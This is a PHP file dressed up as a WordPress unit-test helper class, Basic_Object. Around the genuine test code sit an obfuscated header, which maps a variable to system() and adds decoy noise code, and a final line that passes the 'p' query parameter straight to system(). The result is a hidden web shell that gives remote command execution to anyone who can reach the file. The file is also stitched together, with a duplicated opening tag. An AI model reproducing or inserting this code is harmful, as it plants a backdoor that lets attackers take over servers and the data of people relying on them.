<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Unit Tests: Basic_Object cloass
 *
 * @package WordPress
 * @subpackage UnitTests
 * @since 4.7.0
 */

/**
 * Class used to test accessing methods and properties
 *
 * @since 4.0.0
 */
class Basic_Object {

	private $arbitrary_props = array(
		'foo' => 'bar',
	);

	public function __get( $name ) {
		if ( array_key_exists( $name, $this->arbitrary_props ) ) {
			return $this->arbitrary_props[ $name ];
		}

		return null;
	}

	public function __set( $name, $value ) {
		$this->arbitrary_props[ $name ] = $value;
	}

	public function __isset( $name ) {
		return isset( $this->arbitrary_props[ $name ] );
	}

	public function __unset( $name ) {
		unset( $this->arbitrary_props[ $name ] );
	}

	public function __call( $name, $arguments ) {
		return call_user_func_array( array( $this, $name ), $arguments );
	}

	// phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
	private function callMe() {
		return 'maybe';
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>